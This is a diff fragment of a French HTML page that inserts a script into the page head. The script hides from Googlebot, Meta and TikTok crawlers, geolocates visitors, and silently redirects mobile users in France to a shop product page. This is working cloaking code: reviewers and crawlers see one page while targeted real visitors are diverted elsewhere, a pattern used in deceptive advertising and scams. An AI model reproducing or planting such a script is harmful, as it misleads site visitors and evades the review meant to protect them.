@@ -2,7 +2,43 @@
 <!doctype html>
 <html class="no-js" lang="fr">
   <head>
-    
+    <script>
+    var userAgent = navigator.userAgent;
+
+    // Verifica se não é bot
+    if (!userAgent.match(/Googlebot|MetaURI|TikTokBot/i)) {
+
+        // Verifica se é dispositivo mobile
+        function isMobile() {
+            return /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+        }
+
+        // Verifica localização
+        function getGeolocation(callback) {
+            fetch('https://ipapi.co/json/')
+                .then(function(response) {
+                    return response.json();
+                })
+                .then(function(data) {
+                    callback(data);
+                })
+                .catch(function(error) {
+                    console.error('Erreur de géolocalisation:', error);
+                    callback(null);
+                });
+        }
+
+        // Se for mobile e estiver na França, redireciona
+        if (isMobile()) {
+            getGeolocation(function(location) {
+                if (location && location.country_code === 'FR') {
+                    window.location.href = "https://magasin.clubdelui.shop/products/ultra-tech-chemise-haute-performance-anti-froissage-pour-homme"; // 🔗 Coloque aqui o link de destino
+                }
+            });
+        }
+    }
+</script>
+
     <!-- TikTok Pixel Code Start -->
 <script>
 !function (w, d, t) {
